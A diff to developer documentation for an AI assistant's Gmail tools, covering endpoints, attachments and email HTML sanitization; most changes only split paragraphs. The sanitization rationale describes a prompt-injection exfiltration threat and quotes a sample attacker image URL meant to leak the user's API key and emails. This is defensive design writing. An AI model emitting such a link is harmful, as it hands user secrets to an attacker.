@@ -74,7 +74,11 @@ The Gmail Simple tools do **not** support search queries (no `q` parameter). Sea
 
 ## Gmail Simple API Endpoints
 
-The HTTP endpoints backing the tools stay registered in `quest.py` so sandboxed scripts (`run_script` / `run_python`) can call the same operations over the local proxy at `localhost:$QUEST_PORT` with `Authorization: Bearer $QUEST_API_KEY` (see [Script Runner](../architecture/script-runner.md)). Script calls carry no conversation context: `conversation_id` stays `None`, so URL replacement gracefully degrades to full inline URLs and workspace draft attachments are unavailable (see [conversation_id Auto-Injection](#conversation_id-auto-injection)). The generic `curl_proxy_get`/`curl_proxy_post` tools can also still reach these routes, but the LLM-facing documentation (`api/gmail/instructions.py`, surfaced as the `system:gmail` skill) steers the model to the dedicated tools.
+The HTTP endpoints backing the tools stay registered in `quest.py` so sandboxed scripts (`run_script` / `run_python`) can call the same operations over the local proxy at `localhost:$QUEST_PORT` with `Authorization: Bearer $QUEST_API_KEY` (see [Script Runner](../architecture/script-runner.md)).
+
+Script calls carry no conversation context: `conversation_id` stays `None`, so URL replacement gracefully degrades to full inline URLs and workspace draft attachments are unavailable (see [conversation_id Auto-Injection](#conversation_id-auto-injection)).
+
+The generic `curl_proxy_get`/`curl_proxy_post` tools can also still reach these routes, but the LLM-facing documentation (`api/gmail/instructions.py`, surfaced as the `system:gmail` skill) steers the model to the dedicated tools.
 
 All Simple API endpoints are defined in `api/gmail/simple_endpoints.py`. See that file for parameters and error codes.
 
@@ -185,13 +189,29 @@ On the tool path, the Gmail Simple tool handlers pass `conversation_id` straight
 
 **Implementation:** `send_email_to_self()` in `api/gmail/draft_endpoints.py`
 
-Sends an email from the user to themselves via the Gmail API. The subject is automatically prefixed with `[Quest]` (enforced server-side via `_QUEST_SUBJECT_PREFIX` in `api/gmail/constants.py`). The body is provided as markdown and rendered to HTML using `convert_markdown_to_html()` in `api/gmail/helpers.py` (sanitized, see below). Optional `attachments` take the same `DraftAttachment` list as drafts and go through the same shared resolvers (see [Attachments](#attachments)), so an attached image can be shown inline with `![caption](cid:<filename>)` while remote images stay stripped; the response echoes `attachments: [{filename, content_id, inline_image}]`. Workspace attachments need the dispatch-injected `conversation_id` (ownership-checked via `require_owned_conversation()`), so they are tool-only -- a sandbox-script call to the HTTP route without one gets a 400 before anything is sent. See `SendEmailToSelfRequest` in `api/gmail/models.py` for request fields. Exercised by `test_send_self_attached_image_renders_inline_via_cid` / `test_send_self_workspace_attachment_requires_conversation_id` in `tests/test_email_html_sanitizer.py`.
+Sends an email from the user to themselves via the Gmail API. The subject is automatically prefixed with `[Quest]` (enforced server-side via `_QUEST_SUBJECT_PREFIX` in `api/gmail/constants.py`). The body is provided as markdown and rendered to HTML using `convert_markdown_to_html()` in `api/gmail/helpers.py` (sanitized, see below).
+
+Optional `attachments` take the same `DraftAttachment` list as drafts and go through the same shared resolvers (see [Attachments](#attachments)), so an attached image can be shown inline with `![caption](cid:<filename>)` while remote images stay stripped; the response echoes `attachments: [{filename, content_id, inline_image}]`.
+
+Workspace attachments need the dispatch-injected `conversation_id` (ownership-checked via `require_owned_conversation()`), so they are tool-only -- a sandbox-script call to the HTTP route without one gets a 400 before anything is sent.
+
+See `SendEmailToSelfRequest` in `api/gmail/models.py` for request fields. Exercised by `test_send_self_attached_image_renders_inline_via_cid` / `test_send_self_workspace_attachment_requires_conversation_id` in `tests/test_email_html_sanitizer.py`.
 
 ### Outgoing HTML Sanitization
 
-Every email body Quest renders from markdown -- Gmail drafts and self-sends here, and the Outlook draft / self-send tools in `plugins/m365` which reuse the same helper -- goes through `sanitize_email_html()` in `api/gmail/helpers.py`, called unconditionally by `convert_markdown_to_html()`. The policy is **no remote references**: an `<img>` survives only when its `src` is a `cid:` content-id (an attachment of the message itself); a remote image is replaced by its alt text (or dropped when it has none). Raw HTML written into the markdown is reduced to the same allow-list of formatting tags markdown produces (`_EMAIL_HTML_ALLOWED_TAGS`), `style` attributes / `<style>` / `<link>` / `<script>` / `<iframe>` / `<object>` / `<embed>` / `<svg>` / comments are removed, and `<a href>` keeps only `http:`/`https:`/`mailto:` (and relative) targets. Text is re-escaped on output.
+Every email body Quest renders from markdown -- Gmail drafts and self-sends here, and the Outlook draft / self-send tools in `plugins/m365` which reuse the same helper -- goes through `sanitize_email_html()` in `api/gmail/helpers.py`, called unconditionally by `convert_markdown_to_html()`.
 
-**Why:** `send_gmail_to_self` and `m365_send_mail_to_self` deliver model-generated content to the user's inbox without an approval card, and drafts are opened in a mail client before the user reviews them. Mail clients fetch remote images when a message is displayed (Gmail proxies them automatically), so a prompt-injected `![](https://attacker/?k=...)` carrying anything the model can see -- the user's Quest API key from the proxy preamble, email contents, memories -- would be exfiltrated the moment the user opened the email. Sanitizing at the shared renderer makes the guarantee hold for every caller instead of relying on each tool to remember. Inline images referenced by `cid:` are allowed because the draft tools and `send_gmail_to_self` give every attachment a `Content-ID` (see [Attachments](#attachments)), so the agent embeds an image by attaching it and writing `![caption](cid:<filename>)`. A `cid:` image is safe on the no-approval self-send path because the bytes come from the message itself (workspace / Drive / Gmail attachments the user already owns) and the fixed recipient is the user -- no fetch leaves the mailbox when the email is opened. `m365_send_mail_to_self` still takes no attachments, so its body never renders an image.
+The policy is **no remote references**: an `<img>` survives only when its `src` is a `cid:` content-id (an attachment of the message itself); a remote image is replaced by its alt text (or dropped when it has none).
+
+Raw HTML written into the markdown is reduced to the same allow-list of formatting tags markdown produces (`_EMAIL_HTML_ALLOWED_TAGS`), `style` attributes / `<style>` / `<link>` / `<script>` / `<iframe>` / `<object>` / `<embed>` / `<svg>` / comments are removed, and `<a href>` keeps only `http:`/`https:`/`mailto:` (and relative) targets. Text is re-escaped on output.
+
+**Why:** `send_gmail_to_self` and `m365_send_mail_to_self` deliver model-generated content to the user's inbox without an approval card, and drafts are opened in a mail client before the user reviews them. Mail clients fetch remote images when a message is displayed (Gmail proxies them automatically), so a prompt-injected `![](https://attacker/?k=...)` carrying anything the model can see -- the user's Quest API key from the proxy preamble, email contents, memories -- would be exfiltrated the moment the user opened the email.
+
+Sanitizing at the shared renderer makes the guarantee hold for every caller instead of relying on each tool to remember.
+
+Inline images referenced by `cid:` are allowed because the draft tools and `send_gmail_to_self` give every attachment a `Content-ID` (see [Attachments](#attachments)), so the agent embeds an image by attaching it and writing `![caption](cid:<filename>)`.
+
+A `cid:` image is safe on the no-approval self-send path because the bytes come from the message itself (workspace / Drive / Gmail attachments the user already owns) and the fixed recipient is the user -- no fetch leaves the mailbox when the email is opened. `m365_send_mail_to_self` still takes no attachments, so its body never renders an image.
 
 ## Gmail Raw API
 
@@ -199,7 +219,11 @@ The Gmail Raw API provides direct access to the Gmail API at `gmail.googleapis.c
 
 **Access pattern:** The LLM calls Gmail Raw API GET endpoints directly via `tool_call(tool_name="authed_get", arguments={"url": "https://gmail.googleapis.com/gmail/v1/..."})`. The `authed_get` handler in `chat/gemini_api/authed_get.py` matches `gmail.googleapis.com` in `_SERVICE_REGISTRY`, injects per-user Google Services OAuth credentials, and proxies the request. An `allowed_endpoints` validation mechanism restricts which API paths can be called, preventing access to arbitrary Gmail API endpoints. The batch POST endpoint remains as a local proxy route at `/api/gmail-raw/v1/batch`.
 
-Gmail Raw API responses (search results, label-scoped message lists, full thread dumps) routinely exceed the 3 KB `authed_get` size gate. When the model intends to post-process the body with `run_python` / `run_script` rather than read it inline, passing `output_file` on the `authed_get` call writes the JSON under the hidden `.responses/` subdirectory of the conversation/project workspace (non-destructively -- a name collision errors) and returns a small receipt whose `path` is the `.responses/...` location instead of the body. See [Large Response Protection](../architecture/gemini-api.md#large-response-protection) for the size gate, the `force_large_response` blob path, and the `output_file` `.responses/` branch.
+Gmail Raw API responses (search results, label-scoped message lists, full thread dumps) routinely exceed the 3 KB `authed_get` size gate.
+
+When the model intends to post-process the body with `run_python` / `run_script` rather than read it inline, passing `output_file` on the `authed_get` call writes the JSON under the hidden `.responses/` subdirectory of the conversation/project workspace (non-destructively -- a name collision errors) and returns a small receipt whose `path` is the `.responses/...` location instead of the body.
+
+See [Large Response Protection](../architecture/gemini-api.md#large-response-protection) for the size gate, the `force_large_response` blob path, and the `output_file` `.responses/` branch.
 
 ### Allowed Endpoints Validation
 
@@ -282,7 +306,9 @@ The Simple API exists for LLM consumption -- it decodes base64 content, converts
 The Simple API was originally reached by having the model construct `http://localhost:8000/api/gmail-simple/...` URLs for the generic `curl_proxy_get`/`curl_proxy_post` tools. Dedicated tools give each operation a typed schema (the model can't mistype a query parameter or URL path), let dispatch supply `conversation_id` without route-dispatch signature introspection, and make intent visible in the UI as a named tool call. The HTTP endpoints are deliberately kept registered: sandboxed scripts reach them over real HTTP through the local proxy (`QUEST_PORT`/`QUEST_API_KEY`), a path that never touched `curl_proxy_get`'s in-process dispatch.
 
 **Why return markdown from the message-fetch endpoints instead of JSON?**
-The LLM consumes these responses directly as tool-call output. A JSON envelope wrapping a markdown body (the previous shape) forced the model to read past quoted JSON punctuation and escape sequences to reach the email content, while the structured metadata next to it (headers, labels, attachment IDs) could just as easily be surfaced as labelled lines. Emitting a single markdown document (`render_message_markdown()` / `render_batch_markdown()` in `api/gmail/helpers.py`) gives the model a readable subject/headers/body/attachments layout, keeps every metadata field recoverable (including the `Message-ID` header used for reply threading and each attachment's `attachmentId`), and lets direct HTTP clients serve the same bytes with `Content-Type: text/markdown`.
+The LLM consumes these responses directly as tool-call output. A JSON envelope wrapping a markdown body (the previous shape) forced the model to read past quoted JSON punctuation and escape sequences to reach the email content, while the structured metadata next to it (headers, labels, attachment IDs) could just as easily be surfaced as labelled lines.
+
+Emitting a single markdown document (`render_message_markdown()` / `render_batch_markdown()` in `api/gmail/helpers.py`) gives the model a readable subject/headers/body/attachments layout, keeps every metadata field recoverable (including the `Message-ID` header used for reply threading and each attachment's `attachmentId`), and lets direct HTTP clients serve the same bytes with `Content-Type: text/markdown`.
 
 **Why use `authed_get` for Gmail Raw API reads instead of proxy endpoints?**
 The `authed_get` pattern (used by Google Calendar, Google Drive, and Google Docs) is simpler than maintaining dedicated proxy endpoints for each GET operation. The LLM calls `gmail.googleapis.com` directly, and `authed_get` handles credential injection, 401 retry, and per-user OAuth transparently. The batch POST endpoint remains as a proxy route because `authed_get` only supports GET requests.
